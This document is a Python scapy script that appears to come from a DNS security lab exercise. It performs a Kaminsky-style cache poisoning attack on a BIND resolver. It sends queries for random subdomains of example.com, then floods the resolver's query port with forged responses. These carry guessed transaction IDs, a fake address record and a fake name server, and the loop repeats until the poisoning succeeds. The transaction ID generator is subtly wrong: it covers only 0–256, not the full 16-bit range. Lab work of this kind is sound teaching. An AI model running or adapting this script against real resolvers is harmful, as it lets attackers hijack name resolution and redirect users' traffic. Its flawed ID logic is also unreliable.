#!/usr/bin/env python2
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
# dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(bytes(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def spamFakeResponse(target_ip, dns_port, subdomain):
    # in spam response do several things
    # create different TX id, combine them into the response packet
    # same fake name server ns.dnslabattacker.net
    fake = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    txid = getRandomTXID()
    QD = DNSQR(qname = subdomain)
    AN = DNSRR(rrname = subdomain, ttl = 86400, rdata = "1.2.3.4")
    NS = DNSRR(rrname = "example.com", ttl = 86400, type='NS', rdata="ns.dnslabattacker.net")
    response = DNS(id = txid, qr = 1, aa = 1, opcode = 0, rd = 1, qd = QD, an = AN, ns = NS, ancount = 1, nscount = 1, qdcount = 1, arcount = 0)
    sendPacket(fake, response, target_ip, dns_port)
    # print("test")

    fake.close()


if __name__ == '__main__':
    # exampleSendDNSQuery()
    # need to do several things here:
    # 1. send a request with a random subdomain name to the BIND server
    # 2. while the bind server is waiting, spam it with a series of fake responses with the desired fake name server
    # 3. check the response from the server actually matches what we want to achieve, close connection; if not keep repeating
    # keep in mind that there will be two NS for example.com as previous part examined

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        subdomain = getRandomSubDomain() + ".example.com"
        dnsPacket = DNS(rd=1, qd=DNSQR(qname=subdomain))
        sendPacket(sock, dnsPacket, my_ip, my_port)
        print("Queried for:", subdomain) 

        for _ in range(150):
            spamFakeResponse(my_ip, my_query_port, subdomain)

        response, _ = sock.recvfrom(4096)
        response = DNS(response)
        if response.an and response.an.rdata == "1.2.3.4":
            print("Hacked")
            break

        time.sleep(1)
